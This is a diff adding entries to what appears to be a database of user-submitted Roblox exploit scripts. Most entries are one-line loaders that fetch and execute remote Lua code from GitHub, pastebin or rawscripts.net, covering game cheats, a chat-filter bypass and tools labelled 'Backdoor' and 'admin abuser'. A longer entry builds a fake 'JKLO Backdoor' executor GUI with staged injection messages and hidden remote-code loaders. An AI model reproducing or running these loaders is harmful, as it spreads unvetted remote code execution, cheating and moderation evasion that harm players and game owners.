@@ -6351,6 +6351,702 @@
       "Script_Title": "build a boat",
       "User_ID": 2569075529,
       "Username": "Romanistdumm300"
+    },
+    "Script1061": {
+      "Date": "November 08 2024",
+      "Description": "this is so skibidi",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/TrollGuiMaker/f0rtuit0us-hub/refs/heads/main/old\"))()\n",
+      "Script_Title": "brookhaven",
+      "User_ID": 2036731065,
+      "Username": "Hey_Bear111"
+    },
+    "Script1062": {
+      "Date": "November 07 2024",
+      "Description": "Fulbright ",
+      "Script": "if not _G.FullBrightExecuted then\n\n\t_G.FullBrightEnabled = false\n\n\t_G.NormalLightingSettings = {\n\t\tBrightness = game:GetService(\"Lighting\").Brightness,\n\t\tClockTime = game:GetService(\"Lighting\").ClockTime,\n\t\tFogEnd = game:GetService(\"Lighting\").FogEnd,\n\t\tGlobalShadows = game:GetService(\"Lighting\").GlobalShadows,\n\t\tAmbient = game:GetService(\"Lighting\").Ambient\n\t}\n\n\tgame:GetService(\"Lighting\"):GetPropertyChangedSignal(\"Brightness\"):Connect(function()\n\t\tif game:GetService(\"Lighting\").Brightness ~= 1 and game:GetService(\"Lighting\").Brightness ~= _G.NormalLightingSettings.Brightness then\n\t\t\t_G.NormalLightingSettings.Brightness = game:GetService(\"Lighting\").Brightness\n\t\t\tif not _G.FullBrightEnabled then\n\t\t\t\trepeat\n\t\t\t\t\twait()\n\t\t\t\tuntil _G.FullBrightEnabled\n\t\t\tend\n\t\t\tgame:GetService(\"Lighting\").Brightness = 1\n\t\tend\n\tend)\n\n\tgame:GetService(\"Lighting\"):GetPropertyChangedSignal(\"ClockTime\"):Connect(function()\n\t\tif game:GetService(\"Lighting\").ClockTime ~= 12 and game:GetService(\"Lighting\").ClockTime ~= _G.NormalLightingSettings.ClockTime then\n\t\t\t_G.NormalLightingSettings.ClockTime = game:GetService(\"Lighting\").ClockTime\n\t\t\tif not _G.FullBrightEnabled then\n\t\t\t\trepeat\n\t\t\t\t\twait()\n\t\t\t\tuntil _G.FullBrightEnabled\n\t\t\tend\n\t\t\tgame:GetService(\"Lighting\").ClockTime = 12\n\t\tend\n\tend)\n\n\tgame:GetService(\"Lighting\"):GetPropertyChangedSignal(\"FogEnd\"):Connect(function()\n\t\tif game:GetService(\"Lighting\").FogEnd ~= 786543 and game:GetService(\"Lighting\").FogEnd ~= _G.NormalLightingSettings.FogEnd then\n\t\t\t_G.NormalLightingSettings.FogEnd = game:GetService(\"Lighting\").FogEnd\n\t\t\tif not _G.FullBrightEnabled then\n\t\t\t\trepeat\n\t\t\t\t\twait()\n\t\t\t\tuntil _G.FullBrightEnabled\n\t\t\tend\n\t\t\tgame:GetService(\"Lighting\").FogEnd = 786543\n\t\tend\n\tend)\n\n\tgame:GetService(\"Lighting\"):GetPropertyChangedSignal(\"GlobalShadows\"):Connect(function()\n\t\tif game:GetService(\"Lighting\").GlobalShadows ~= false and game:GetService(\"Lighting\").GlobalShadows ~= _G.NormalLightingSettings.GlobalShadows then\n\t\t\t_G.NormalLightingSettings.GlobalShadows = game:GetService(\"Lighting\").GlobalShadows\n\t\t\tif not _G.FullBrightEnabled then\n\t\t\t\trepeat\n\t\t\t\t\twait()\n\t\t\t\tuntil _G.FullBrightEnabled\n\t\t\tend\n\t\t\tgame:GetService(\"Lighting\").GlobalShadows = false\n\t\tend\n\tend)\n\n\tgame:GetService(\"Lighting\"):GetPropertyChangedSignal(\"Ambient\"):Connect(function()\n\t\tif game:GetService(\"Lighting\").Ambient ~= Color3.fromRGB(178, 178, 178) and game:GetService(\"Lighting\").Ambient ~= _G.NormalLightingSettings.Ambient then\n\t\t\t_G.NormalLightingSettings.Ambient = game:GetService(\"Lighting\").Ambient\n\t\t\tif not _G.FullBrightEnabled then\n\t\t\t\trepeat\n\t\t\t\t\twait()\n\t\t\t\tuntil _G.FullBrightEnabled\n\t\t\tend\n\t\t\tgame:GetService(\"Lighting\").Ambient = Color3.fromRGB(178, 178, 178)\n\t\tend\n\tend)\n\n\tgame:GetService(\"Lighting\").Brightness = 1\n\tgame:GetService(\"Lighting\").ClockTime = 12\n\tgame:GetService(\"Lighting\").FogEnd = 786543\n\tgame:GetService(\"Lighting\").GlobalShadows = false\n\tgame:GetService(\"Lighting\").Ambient = Color3.fromRGB(178, 178, 178)\n\n\tlocal LatestValue = true\n\tspawn(function()\n\t\trepeat\n\t\t\twait()\n\t\tuntil _G.FullBrightEnabled\n\t\twhile wait() do\n\t\t\tif _G.FullBrightEnabled ~= LatestValue then\n\t\t\t\tif not _G.FullBrightEnabled then\n\t\t\t\t\tgame:GetService(\"Lighting\").Brightness = _G.NormalLightingSettings.Brightness\n\t\t\t\t\tgame:GetService(\"Lighting\").ClockTime = _G.NormalLightingSettings.ClockTime\n\t\t\t\t\tgame:GetService(\"Lighting\").FogEnd = _G.NormalLightingSettings.FogEnd\n\t\t\t\t\tgame:GetService(\"Lighting\").GlobalShadows = _G.NormalLightingSettings.GlobalShadows\n\t\t\t\t\tgame:GetService(\"Lighting\").Ambient = _G.NormalLightingSettings.Ambient\n\t\t\t\telse\n\t\t\t\t\tgame:GetService(\"Lighting\").Brightness = 1\n\t\t\t\t\tgame:GetService(\"Lighting\").ClockTime = 12\n\t\t\t\t\tgame:GetService(\"Lighting\").FogEnd = 786543\n\t\t\t\t\tgame:GetService(\"Lighting\").GlobalShadows = false\n\t\t\t\t\tgame:GetService(\"Lighting\").Ambient = Color3.fromRGB(178, 178, 178)\n\t\t\t\tend\n\t\t\t\tLatestValue = not LatestValue\n\t\t\tend\n\t\tend\n\tend)\nend\n\n_G.FullBrightExecuted = true\n_G.FullBrightEnabled = not _G.FullBrightEnabled",
+      "Script_Title": "Fullbright",
+      "User_ID": 2446285707,
+      "Username": "tfytjkg"
+    },
+    "Script1063": {
+      "Date": "November 08 2024",
+      "Description": "This script is bypass you chat all words",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Synergy-Networks/products/main/BetterBypasser/loader.lua\",true))()",
+      "Script_Title": "chat bupasser🏳️",
+      "User_ID": 4938952269,
+      "Username": "MurDer666558"
+    },
+    "Script1064": {
+      "Date": "November 08 2024",
+      "Description": "this script open gamedata menu, u use weroblox hack",
+      "Script": "loadstring(game:HttpGet(\"https://pastebin.com/raw/PXAdj6ED\"))();",
+      "Script_Title": "Backdoor",
+      "User_ID": 4938952269,
+      "Username": "MurDer666558"
+    },
+    "Script1066": {
+      "Date": "November 07 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/REDzHUB/REDzHUB/main/REDzHUB\"))()",
+      "Script_Title": "leag",
+      "User_ID": 7546221106,
+      "Username": "semnome_DOJOB"
+    },
+    "Script1067": {
+      "Date": "November 07 2024",
+      "Description": "SANDER SCRIPT BEST",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/kigredns/SanderXV4.2.2/refs/heads/main/New.lua'))()",
+      "Script_Title": "Brookhaven best scri",
+      "User_ID": 4796378264,
+      "Username": "theprotagontistbaco"
+    },
+    "Script1068": {
+      "Date": "November 07 2024",
+      "Description": "ux",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/zephyr10101/showcases/main/fedoratumadmin\",true))()",
+      "Script_Title": "HX admin abuser (OP)",
+      "User_ID": 7408087081,
+      "Username": "kit_cynALT"
+    },
+    "Script1069": {
+      "Date": "November 08 2024",
+      "Description": "the strongest battlegrounds",
+      "Script": "getgenv().ToggleKeybind = Enum.KeyCode.RightControl\ngetgenv().FreeEmotesTab = false\nloadstring(game:HttpGet(\"https://raw.githubusercontent.com/ATrainz/main/main/Phantasm-Loader.lua\"))()",
+      "Script_Title": "tsb",
+      "User_ID": 7492159118,
+      "Username": "aiskh7453"
+    },
+    "Script1070": {
+      "Date": "November 08 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-Gaze-Bypass-V6-21756\"))()",
+      "Script_Title": "gaze v6",
+      "User_ID": 7546310020,
+      "Username": "elbanana404"
+    },
+    "Script1071": {
+      "Date": "November 08 2024",
+      "Description": "auto blackflash for jujutsu shenanigans ",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/SAZXHUB/black_flash_GUI/refs/heads/main/README.md\"))()",
+      "Script_Title": "auto blackflash jjs",
+      "User_ID": 7465192314,
+      "Username": "superskibidid12"
+    },
+    "Script1072": {
+      "Date": "November 07 2024",
+      "Description": "HX47=]",
+      "Script": "game.StarterGui:SetCore(\"DevConsoleVisible\", true)\r\nwait(1)\r\nprint(\"Found ROBLOX Process...\")\r\ngame.StarterGui:SetCore(\"DevConsoleVisible\", true)\r\nwait(2)\r\nprint(\"Injecting 'JKLO' into CoreGui...\")\r\ngame.StarterGui:SetCore(\"DevConsoleVisible\", true)\r\nwait(4)\r\nprint(\"Injection Complete!\")\r\nwait(1)\r\ngame.StarterGui:SetCore(\"DevConsoleVisible\", false)\r\n\r\n\r\nlocal STIGMA = Instance.new(\"ScreenGui\")\r\nlocal Frame = Instance.new(\"Frame\")\r\nlocal main = Instance.new(\"Frame\")\r\nlocal ScrollingFrame = Instance.new(\"ScrollingFrame\")\r\nlocal input = Instance.new(\"TextBox\")\r\nlocal execute = Instance.new(\"TextButton\")\r\nlocal clear = Instance.new(\"TextButton\")\r\nlocal file = Instance.new(\"TextButton\")\r\nlocal extras = Instance.new(\"TextButton\")\r\nlocal lua = Instance.new(\"TextButton\")\r\nlocal help = Instance.new(\"TextButton\")\r\nlocal fileframe = Instance.new(\"Frame\")\r\nlocal minimize = Instance.new(\"TextButton\")\r\nlocal exit = Instance.new(\"TextButton\")\r\nlocal TextLabel = Instance.new(\"TextLabel\")\r\nlocal minimized = Instance.new(\"TextButton\")\r\nlocal windowframe = Instance.new(\"Frame\")\r\nlocal windowmain = Instance.new(\"Frame\")\r\nlocal createdby = Instance.new(\"TextLabel\")\r\nlocal buttonframe = Instance.new(\"Frame\")\r\nlocal TextButton = Instance.new(\"TextButton\")\r\nlocal abouttext = Instance.new(\"TextLabel\")\r\nlocal helpframe = Instance.new(\"Frame\")\r\nlocal about = Instance.new(\"TextButton\")\r\nlocal ImageLabel = Instance.new(\"ImageLabel\")\r\n\r\n\r\n\r\nSTIGMA.Name = \"STIGMA\"\r\nSTIGMA.Parent = game.CoreGui\r\nSTIGMA.ZIndexBehavior = Enum.ZIndexBehavior.Sibling\r\nSTIGMA.Parent = game.CoreGui\r\n\r\nFrame.Parent = STIGMA\r\nFrame.BackgroundColor3 = Color3.fromRGB(253, 253, 253)\r\nFrame.BorderColor3 = Color3.fromRGB(143, 210, 255)\r\nFrame.BorderSizePixel = 0\r\nFrame.Position = UDim2.new(0.132295713, 0, 0.169778302, 0)\r\nFrame.Size = UDim2.new(0, 332, 0, 252)\r\nFrame.Active = true\r\nFrame.Draggable = true\r\n\r\nmain.Name = \"main\"\r\nmain.Parent = Frame\r\nmain.BackgroundColor3 = Color3.fromRGB(243, 243, 243)\r\nmain.BorderColor3 = Color3.fromRGB(152, 152, 152)\r\nmain.Position = UDim2.new(0.00608264981, 0, 0.10370709, 0)\r\nmain.Size = UDim2.new(0, 327, 0, 225)\r\n\r\nScrollingFrame.Parent = main\r\nScrollingFrame.Active = true\r\nScrollingFrame.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)\r\nScrollingFrame.BorderColor3 = Color3.fromRGB(152, 152, 152)\r\nScrollingFrame.Position = UDim2.new(-4.6662965e-08, 0, 0.088888891, 0)\r\nScrollingFrame.Selectable = false\r\nScrollingFrame.Size = UDim2.new(0, 286, 0, 205)\r\n\r\ninput.Name = \"input\"\r\ninput.Parent = ScrollingFrame\r\ninput.BackgroundColor3 = Color3.fromRGB(255, 255, 255)\r\ninput.BorderColor3 = Color3.fromRGB(0, 0, 0)\r\ninput.BorderSizePixel = 0\r\ninput.Position = UDim2.new(0, 0, 7.44331174e-08, 0)\r\ninput.Size = UDim2.new(0, 272, 0, 449)\r\ninput.Font = Enum.Font.Arcade\r\ninput.Text = \"\"\r\ninput.TextColor3 = Color3.fromRGB(0, 0, 0)\r\ninput.TextSize = 14.000\r\ninput.TextXAlignment = Enum.TextXAlignment.Left\r\ninput.TextYAlignment = Enum.TextYAlignment.Top\r\ninput.MultiLine = true\r\n\r\nexecute.Name = \"execute\"\r\nexecute.Parent = main\r\nexecute.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)\r\nexecute.BorderColor3 = Color3.fromRGB(199, 199, 199)\r\nexecute.Position = UDim2.new(0.877675772, 0, 0.088888891, 0)\r\nexecute.Size = UDim2.new(0, 40, 0, 102)\r\nexecute.Font = Enum.Font.Arcade\r\nexecute.Text = \"EXE\"\r\nexecute.TextColor3 = Color3.fromRGB(0, 0, 0)\r\nexecute.TextSize = 14.000\r\nexecute.MouseButton1Click:Connect(function()\r\nif KeyBox.Text == \"require(5253281926).bjgui('Tubers93HKRB')\" then\r\n\t\tFrame.Visible = false\r\n\t\twait(0.1)\r\n\t\tloadstring(game:HttpGet(\"https://raw.githubusercontent.com/BOSSJKL2/UPDBOSJKLSO/main/UPDBOSJKLSORANKS\"))()\r\n\tend\r\nwait(1)\r\nif KeyBox.Text == \"require(4815027269).k00pzkidd('Tubers93HKRB')\" then\r\n\t\tFrame.Visible = false\r\n\t\twait(0.1)\r\n\t\tloadstring(game:HttpGet(\"https://raw.githubusercontent.com/BOSSJKL2/Skid/main/S\"))()\r\nend\r\nend)\r\nclear.Name = \"clear\"\r\nclear.Parent = main\r\nclear.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)\r\nclear.BorderColor3 = Color3.fromRGB(199, 199, 199)\r\nclear.Position = UDim2.new(0.877675772, 0, 0.546666682, 0)\r\nclear.Size = UDim2.new(0, 40, 0, 102)\r\nclear.Font = Enum.Font.Arcade\r\nclear.Text = \"CLEAR\"\r\nclear.TextColor3 = Color3.fromRGB(0, 0, 0)\r\nclear.TextSize = 14.000\r\nclear.MouseButton1Click:Connect(function()\r\n\tinput.Text = \"CLEAR\"\r\nwait(2)\r\ninput.Text = \"\"\r\nend)\r\n\r\nfile.Name = \"file\"\r\nfile.Parent = main\r\nfile.BackgroundColor3 = Color3.fromRGB(255, 255, 255)\r\nfile.BackgroundTransparency = 1.000\r\nfile.BorderColor3 = Color3.fromRGB(0, 0, 0)\r\nfile.BorderSizePixel = 0\r\nfile.Size = UDim2.new(0, 36, 0, 20)\r\nfile.Font = Enum.Font.SourceSans\r\nfile.Text = \"File\"\r\nfile.TextColor3 = Color3.fromRGB(0, 0, 0)\r\nfile.TextSize = 14.000\r\nfile.MouseButton1Click:Connect(function()\r\n\tfileframe.Visible = true\r\n\thelpframe.Visible = false\r\n\r\n\r\nend)\r\n\r\nextras.Name = \"extras\"\r\nextras.Parent = main\r\nextras.BackgroundColor3 = Color3.fromRGB(255, 255, 255)\r\nextras.BackgroundTransparency = 1.000\r\nextras.BorderColor3 = Color3.fromRGB(0, 0, 0)\r\nextras.BorderSizePixel = 0\r\nextras.Position = UDim2.new(0.110091746, 0, 0, 0)\r\nextras.Size = UDim2.new(0, 36, 0, 20)\r\nextras.Font = Enum.Font.SourceSans\r\nextras.Text = \"Extras\"\r\nextras.TextColor3 = Color3.fromRGB(0, 0, 0)\r\nextras.TextSize = 14.000\r\n\r\n\r\nlua.Name = \"lua\"\r\nlua.Parent = main\r\nlua.BackgroundColor3 = Color3.fromRGB(255, 255, 255)\r\nlua.BackgroundTransparency = 1.000\r\nlua.BorderColor3 = Color3.fromRGB(0, 0, 0)\r\nlua.BorderSizePixel = 0\r\nlua.Position = UDim2.new(0.220183492, 0, 0, 0)\r\nlua.Size = UDim2.new(0, 36, 0, 20)\r\nlua.Font = Enum.Font.SourceSans\r\nlua.Text = \"Lua\"\r\nlua.TextColor3 = Color3.fromRGB(0, 0, 0)\r\nlua.TextSize = 14.000\r\n\r\n\r\n\r\n\r\nhelp.Name = \"help\"\r\nhelp.Parent = main\r\nhelp.BackgroundColor3 = Color3.fromRGB(255, 255, 255)\r\nhelp.BackgroundTransparency = 1.000\r\nhelp.BorderColor3 = Color3.fromRGB(0, 0, 0)\r\nhelp.BorderSizePixel = 0\r\nhelp.Position = UDim2.new(0.330275238, 0, 0, 0)\r\nhelp.Size = UDim2.new(0, 36, 0, 20)\r\nhelp.Font = Enum.Font.SourceSans\r\nhelp.Text = \"Help\"\r\nhelp.TextColor3 = Color3.fromRGB(0, 0, 0)\r\nhelp.TextSize = 14.000\r\nhelp.MouseButton1Down:connect(function()\r\n\thelpframe.Visible = true\r\n\tfileframe.Visible = false\r\n\t\r\n\r\nend)\r\n\r\nfileframe.Name = \"fileframe\"\r\nfileframe.Parent = main\r\nfileframe.BackgroundColor3 = Color3.fromRGB(249, 249, 249)\r\nfileframe.BorderColor3 = Color3.fromRGB(179, 179, 179)\r\nfileframe.Position = UDim2.new(0, 0, 0.0933333337, 0)\r\nfileframe.Size = UDim2.new(0, 132, 0, 37)\r\nfileframe.Visible = false\r\n\r\nminimize.Name = \"minimize\"\r\nminimize.Parent = fileframe\r\nminimize.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)\r\nminimize.BackgroundTransparency = 1.000\r\nminimize.BorderColor3 = Color3.fromRGB(0, 0, 0)\r\nminimize.BorderSizePixel = 0\r\nminimize.Position = UDim2.new(0.174242422, 0, 0, 0)\r\nminimize.Size = UDim2.new(0, 109, 0, 18)\r\nminimize.Font = Enum.Font.SourceSans\r\nminimize.Text = \"Minimize\"\r\nminimize.TextColor3 = Color3.fromRGB(0, 0, 0)\r\nminimize.TextSize = 14.000\r\nminimize.TextXAlignment = Enum.TextXAlignment.Left\r\nminimize.MouseButton1Click:Connect(function()\r\n\tFrame.Visible = false\r\n\tminimized.Visible = true\r\nend)\r\n\r\nexit.Name = \"exit\"\r\nexit.Parent = fileframe\r\nexit.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)\r\nexit.BackgroundTransparency = 1.000\r\nexit.BorderColor3 = Color3.fromRGB(0, 0, 0)\r\nexit.BorderSizePixel = 0\r\nexit.Position = UDim2.new(0.174242422, 0, 0.486486495, 0)\r\nexit.Size = UDim2.new(0, 109, 0, 18)\r\nexit.Font = Enum.Font.SourceSans\r\nexit.Text = \"Exit\"\r\nexit.TextColor3 = Color3.fromRGB(0, 0, 0)\r\nexit.TextSize = 14.000\r\nexit.TextXAlignment = Enum.TextXAlignment.Left\r\nexit.MouseButton1Click:Connect(function()\r\n\tFrame.Visible = false\r\nend)\r\n\r\nTextLabel.Parent = Frame\r\nTextLabel.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)\r\nTextLabel.BackgroundTransparency = 1.000\r\nTextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)\r\nTextLabel.BorderSizePixel = 0\r\nTextLabel.Position = UDim2.new(0.0843373463, 0, 0, 0)\r\nTextLabel.Size = UDim2.new(0, 200, 0, 26)\r\nTextLabel.Font = Enum.Font.SourceSans\r\nTextLabel.Text = \"JKLO Backdoor\"\r\nTextLabel.TextColor3 = Color3.fromRGB(74, 74, 74)\r\nTextLabel.TextSize = 16.000\r\nTextLabel.TextXAlignment = Enum.TextXAlignment.Left\r\n\r\nImageLabel.Parent = Frame\r\nImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)\r\nImageLabel.BackgroundTransparency = 1.000\r\nImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)\r\nImageLabel.BorderSizePixel = 0\r\nImageLabel.Position = UDim2.new(0.00602409616, 0, 0.0119047621, 0)\r\nImageLabel.Size = UDim2.new(0, 19, 0, 20)\r\nImageLabel.Image = \"http://www.roblox.com/asset/?id=15487393092\"\r\n\r\nminimized.Name = \"minimized\"\r\nminimized.Parent = STIGMA\r\nminimized.BackgroundColor3 = Color3.fromRGB(255, 255, 255)\r\nminimized.BorderColor3 = Color3.fromRGB(0, 0, 0)\r\nminimized.BorderSizePixel = 0\r\nminimized.Position = UDim2.new(-0.000545215677, 0, 0.945157588, 0)\r\nminimized.Size = UDim2.new(0, 93, 0, 31)\r\nminimized.Visible = false\r\nminimized.Font = Enum.Font.SourceSans\r\nminimized.Text = \"JKLO\"\r\nminimized.TextColor3 = Color3.fromRGB(0, 0, 0)\r\nminimized.TextSize = 17.000\r\nminimized.MouseButton1Click:Connect(function()\r\n\tFrame.Visible = true\r\n\tfileframe.Visible = false\r\n\tminimized.Visible = false\r\nend)\r\n\r\nhelpframe.Name = \"helpframe\"\r\nhelpframe.Parent = main\r\nhelpframe.BackgroundColor3 = Color3.fromRGB(249, 249, 249)\r\nhelpframe.BorderColor3 = Color3.fromRGB(179, 179, 179)\r\nhelpframe.Position = UDim2.new(0.330275238, 0, 0.088888891, 0)\r\nhelpframe.Size = UDim2.new(0, 109, 0, 18)\r\nhelpframe.Visible = false\r\n\r\nwindowframe.Name = \"windowframe\"\r\nwindowframe.Parent = STIGMA\r\nwindowframe.Active = true\r\nwindowframe.BackgroundColor3 = Color3.fromRGB(253, 253, 253)\r\nwindowframe.BorderColor3 = Color3.fromRGB(143, 210, 255)\r\nwindowframe.BorderSizePixel = 0\r\nwindowframe.Position = UDim2.new(0.597292781, 0, 0.360560119, 0)\r\nwindowframe.Size = UDim2.new(0, 168, 0, 143)\r\nwindowframe.Visible = false\r\n\r\nwindowmain.Name = \"windowmain\"\r\nwindowmain.Parent = windowframe\r\nwindowmain.BackgroundColor3 = Color3.fromRGB(255, 255, 255)\r\nwindowmain.BorderColor3 = Color3.fromRGB(152, 152, 152)\r\nwindowmain.Position = UDim2.new(0.0060828072, 0, 0.181817755, 0)\r\nwindowmain.Size = UDim2.new(0, 165, 0, 115)\r\n\r\ncreatedby.Name = \"createdby\"\r\ncreatedby.Parent = windowmain\r\ncreatedby.BackgroundColor3 = Color3.fromRGB(255, 255, 255)\r\ncreatedby.BackgroundTransparency = 1.000\r\ncreatedby.BorderColor3 = Color3.fromRGB(0, 0, 0)\r\ncreatedby.BorderSizePixel = 0\r\ncreatedby.Position = UDim2.new(-0.212121218, 0, 0.0956521705, 0)\r\ncreatedby.Size = UDim2.new(0, 200, 0, 50)\r\ncreatedby.Font = Enum.Font.SourceSans\r\ncreatedby.Text = \"Created by JO1TAR0\"\r\ncreatedby.TextColor3 = Color3.fromRGB(0, 0, 0)\r\ncreatedby.TextSize = 14.000\r\n\r\nbuttonframe.Name = \"buttonframe\"\r\nbuttonframe.Parent = windowmain\r\nbuttonframe.BackgroundColor3 = Color3.fromRGB(227, 227, 227)\r\nbuttonframe.BorderColor3 = Color3.fromRGB(0, 0, 0)\r\nbuttonframe.BorderSizePixel = 0\r\nbuttonframe.Position = UDim2.new(0, 0, 0.530434787, 0)\r\nbuttonframe.Size = UDim2.new(0, 165, 0, 54)\r\n\r\nTextButton.Parent = buttonframe\r\nTextButton.BackgroundColor3 = Color3.new(0.392157, 0.392157, 0.392157)\r\nTextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)\r\nTextButton.Position = UDim2.new(0.393939406, 0, 0.240740746, 0)\r\nTextButton.Size = UDim2.new(0, 84, 0, 27)\r\nTextButton.Font = Enum.Font.SourceSans\r\nTextButton.Text = \"OK\"\r\nTextButton.TextColor3 = Color3.fromRGB(0, 0, 0)\r\nTextButton.TextSize = 14.000\r\nTextButton.MouseButton1Down:connect(function()\r\n\twindowframe.Visible = false\r\nend)\r\n\r\nabouttext.Name = \"abouttext\"\r\nabouttext.Parent = windowframe\r\nabouttext.BackgroundColor3 = Color3.fromRGB(255, 255, 255)\r\nabouttext.BackgroundTransparency = 1.000\r\nabouttext.BorderColor3 = Color3.fromRGB(0, 0, 0)\r\nabouttext.BorderSizePixel = 0\r\nabouttext.Position = UDim2.new(0.0060828072, 0, 0, 0)\r\nabouttext.Size = UDim2.new(0, 84, 0, 26)\r\nabouttext.Font = Enum.Font.SourceSans\r\nabouttext.Text = \"About\"\r\nabouttext.TextColor3 = Color3.fromRGB(74, 74, 74)\r\nabouttext.TextSize = 16.000\r\nabouttext.TextXAlignment = Enum.TextXAlignment.Left\r\n\r\nabout.Name = \"about\"\r\nabout.Parent = helpframe\r\nabout.BackgroundColor3 = Color3.fromRGB(255, 255, 255)\r\nabout.BackgroundTransparency = 1.000\r\nabout.BorderColor3 = Color3.fromRGB(0, 0, 0)\r\nabout.BorderSizePixel = 0\r\nabout.Position = UDim2.new(0.174242422, 0, 0, 0)\r\nabout.Size = UDim2.new(0, 109, 0, 18)\r\nabout.Font = Enum.Font.SourceSans\r\nabout.Text = \"About\"\r\nabout.TextColor3 = Color3.fromRGB(0, 0, 0)\r\nabout.TextSize = 14.000\r\nabout.TextXAlignment = Enum.TextXAlignment.Left\r\nabout.MouseButton1Down:connect(function()\r\n\thelpframe.Visible = false\r\n\twindowframe.Visible = true\r\nend)\r\n\r\n\r\n\r\n\r\nlocal xbox = Instance.new(\"Sound\")\r\nxbox.Parent = game:GetService(\"SoundService\")\r\nxbox.SoundId = \"rbxassetid://3023237993\"\r\nxbox.Volume = 5\r\nxbox.Name = \"Sound\"\r\nxbox:Play()\r\n\r\ngame:GetService(\"StarterGui\"):SetCore(\"SendNotification\", {\r\n\tTitle = \"JKLO Backdoor\";\r\n\tText = \"JKLO Backdoor has been Injected.\";\r\n\tIcon = \"http://www.roblox.com/asset/?id=15487393092\";\r\n\tDuration = 6; \r\n\tButton1 = \"Ok\";\r\n})\r\n\r\n\r\nlocal function XPCO_fake_script() -- Frame.Dragify \r\n\tlocal script = Instance.new('LocalScript', Frame)\r\n\r\n\tlocal UserInputService = game:GetService(\"UserInputService\")\r\n\r\n\tlocal gui = script.Parent\r\n\r\n\tlocal dragging\r\n\tlocal dragInput\r\n\tlocal dragStart\r\n\tlocal startPos\r\n\r\n\tlocal function update(input)\r\n\t\tlocal delta = input.Position - dragStart\r\n\t\tgui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)\r\n\tend\r\n\r\n\tgui.InputBegan:Connect(function(input)\r\n\t\tif input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then\r\n\t\t\tdragging = true\r\n\t\t\tdragStart = input.Position\r\n\t\t\tstartPos = gui.Position\r\n\r\n\t\t\tinput.Changed:Connect(function()\r\n\t\t\t\tif input.UserInputState == Enum.UserInputState.End then\r\n\t\t\t\t\tdragging = false\r\n\t\t\t\tend\r\n\t\t\tend)\r\n\t\tend\r\n\tend)\r\n\r\n\tgui.InputChanged:Connect(function(input)\r\n\t\tif input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then\r\n\t\t\tdragInput = input\r\n\t\tend\r\n\tend)\r\n\r\n\tUserInputService.InputChanged:Connect(function(input)\r\n\t\tif input == dragInput and dragging then\r\n\t\t\tupdate(input)\r\n\t\tend\r\n\tend)\r\nend\r\ncoroutine.wrap(XPCO_fake_script)()\r\n\r\nlocal function LZVR_fake_script() -- windowframe.windowdrag \r\n\tlocal script = Instance.new('LocalScript', windowframe)\r\n\r\n\tlocal UserInputService = game:GetService(\"UserInputService\")\r\n\r\n\tlocal gui = script.Parent\r\n\r\n\tlocal dragging\r\n\tlocal dragInput\r\n\tlocal dragStart\r\n\tlocal startPos\r\n\r\n\tlocal function update(input)\r\n\t\tlocal delta = input.Position - dragStart\r\n\t\tgui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)\r\n\tend\r\n\r\n\tgui.InputBegan:Connect(function(input)\r\n\t\tif input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then\r\n\t\t\tdragging = true\r\n\t\t\tdragStart = input.Position\r\n\t\t\tstartPos = gui.Position\r\n\r\n\t\t\tinput.Changed:Connect(function()\r\n\t\t\t\tif input.UserInputState == Enum.UserInputState.End then\r\n\t\t\t\t\tdragging = false\r\n\t\t\t\tend\r\n\t\t\tend)\r\n\t\tend\r\n\tend)\r\n\r\n\tgui.InputChanged:Connect(function(input)\r\n\t\tif input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then\r\n\t\t\tdragInput = input\r\n\t\tend\r\n\tend)\r\n\r\n\tUserInputService.InputChanged:Connect(function(input)\r\n\t\tif input == dragInput and dragging then\r\n\t\t\tupdate(input)\r\n\t\tend\r\n\tend)\r\nend\r\ncoroutine.wrap(LZVR_fake_script)()",
+      "Script_Title": "Hx EXECUTOR BLACKDOR",
+      "User_ID": 7408087081,
+      "Username": "kit_cynALT"
+    },
+    "Script1073": {
+      "Date": "November 08 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-CNCPT-Executor-18830\"))()",
+      "Script_Title": "cncpt executor",
+      "User_ID": 7285173567,
+      "Username": "Deltaexecutorcc"
+    },
+    "Script1074": {
+      "Date": "November 08 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Sword-script-Universal-''Leaked''-not-the-same-ui_914\"))()",
+      "Script_Title": "hax sword",
+      "User_ID": 7285173567,
+      "Username": "Deltaexecutorcc"
+    },
+    "Script1075": {
+      "Date": "November 08 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Azura83/Zaphub-/main/zaphub.lua', true))()",
+      "Script_Title": "Pet Sim 99",
+      "User_ID": 1021317796,
+      "Username": "lovekanako"
+    },
+    "Script1076": {
+      "Date": "November 08 2024",
+      "Description": "ADOPT ME",
